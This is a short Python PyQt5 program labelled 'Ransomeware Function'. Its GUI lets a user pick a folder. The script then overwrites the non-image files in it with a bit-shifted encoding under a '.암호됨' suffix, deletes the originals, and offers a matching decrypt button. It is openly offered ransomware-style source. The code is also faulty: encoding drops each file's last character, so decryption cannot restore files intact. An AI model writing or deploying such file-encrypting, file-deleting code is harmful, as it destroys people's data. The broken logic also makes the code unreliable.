import os
import sys
from PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QFileDialog
from PyQt5.QtCore import QCoreApplication

button = []
path = ''
filelist = []

def encode(data):
    encryptData = ''
    for i in range(len(data) - 1):
        encryptData += chr(ord(data[i]) << 2)+'<-[262L<-[*'
    return encryptData

def decode(data):
    decryptData = ''
    filterData = data.split('<-[262L<-[*')
    filterData = [i for i in filterData if i not in {'<-[262L<-[*'}]
    filterData = ''.join(filterData)
    
    for i in range(len(filterData)):
        decryptData += chr(ord(filterData[i]) >> 2)
    return decryptData

def replaceEncrypt(name, text):
    file = open(name+'.암호됨', 'w', encoding='cp949')
    file.write(text)
    file.close()

def replaceDecrypt(name, text):
    file = open(name.replace('.암호됨', ''), 'w', encoding='cp949')
    file.write(text)
    file.close()

def encrypt():
    global filelist
    img = [
        ".jpg",
        ".png",
        ".jpeg",
        ".bmp",
        ".gif",
        ".tif",
        ".tiff",
        ".raw",
        ".psd",
        ".ai",
        ".svg",
        ".esp",
        ".tga"
        ]
    
    for i in filelist:
        a = os.path.splitext(i)
        
        if i == os.path.basename(sys.argv[0]) or a[len(a) - 1] in img:
            continue

        filedata = open(i ,  "r", encoding='cp949')
        print('암호화 진행중')
        print('파일이름 : ' + i)
        replaceEncrypt(i, encode(filedata.read()))
        print('암호화 완료')
        print('= ' * 20)
        os.remove(i)
        filedata.close()
    filelist = os.listdir(path)

def decrypt():
    global filelist
    encodefile = [file for file in filelist if file.endswith(r'.암호됨')]
    for i in encodefile:
        file = open(i, 'r', encoding='cp949').read()
        print('복호화 진행중')
        print('파일이름 : ' + i)
        replaceDecrypt(i, decode(file))
        print('복호화 완료')
        print('= ' * 20)
        os.remove(i)
    filelist = os.listdir(path)

       
app = QApplication(sys.argv)
window = QWidget()
window.setWindowTitle("Ransomeware Function")
window.setGeometry(300, 300, 600, 200)
window.setFixedSize(600, 200)

def selectPath():
    global path, filelist
    path = QFileDialog.getExistingDirectory(window, "Find Floder")
    filelist = os.listdir(path)

def addButton(text, move=(0,0), size=(150,50), function=None):
    global window, button
    button.append(QPushButton(text, window))
    if function is not None:
        button[len(button) -1].clicked.connect(function)
    return button[len(button) -1].setGeometry(move[0], move[1], size[0], size[1])

addButton('Path', move=(230, 30), function=selectPath)
addButton('Encrypt', move=(100, 100), function=encrypt)
addButton('Decrypt', move=(360, 100), function=decrypt)

window.show()


